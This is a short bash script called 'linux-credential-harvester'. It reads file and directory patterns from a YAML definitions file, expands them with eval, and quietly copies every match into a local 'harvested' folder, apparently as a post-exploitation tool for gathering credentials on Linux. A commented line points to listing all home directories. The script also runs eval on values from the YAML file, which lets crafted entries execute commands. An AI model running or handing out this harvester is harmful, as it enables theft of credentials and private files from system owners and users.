#!/usr/bin/env bash

################################
#
# linux-credential-harvester
#
# by auraltension
#
################################

output_location=harvested

parse_yaml() {
   local prefix="$2"
   local s='[[:space:]]*' w='[a-zA-Z0-9_]*' fs=$(echo @|tr @ '\034')
   sed -ne "s|^\($s\):|\1|" \
        -e "s|^\($s\)\($w\)$s:$s[\"']\(.*\)[\"']$s\$|\1$fs\2$fs\3|p" \
        -e "s|^\($s\)\($w\)$s:$s\(.*\)$s\$|\1$fs\2$fs\3|p"  $1 |
   awk -F$fs '{
      indent = length($1)/2;
      vname[indent] = $2;
      for (i in vname) {if (i > indent) {delete vname[i]}}
      if (length($3) > 0) {
         vn=""; for (i=0; i<indent; i++) {vn=(vn)(vname[i])("_")}
         printf("%s%s%s=\"%s\"\n", "'$prefix'",vn, $2, $3);
      }
   }'
}

echo "Harvesting!"

mkdir -p $output_location

# Find all home dirs
#getent passwd | cut -d: -f 6

for i in $(parse_yaml definitions.yml); do
  if [ ${i:0:5} = "file_" ]; then
    eval f=${i#*=}
    for i in $(eval echo $f); do j=${i:1:${#i}}; cp $i $output_location/${j//\//-}; done 2>/dev/null
  fi
  if [ ${i:0:10} = "directory_" ]; then
    eval f=${i#*=}
    for i in $(eval echo $f); do j=${i:1:${#i}}; cp -aP $i $output_location/${j//\//-}; done 2>/dev/null
  fi
done

echo "Finished. results will be available in $output_location"
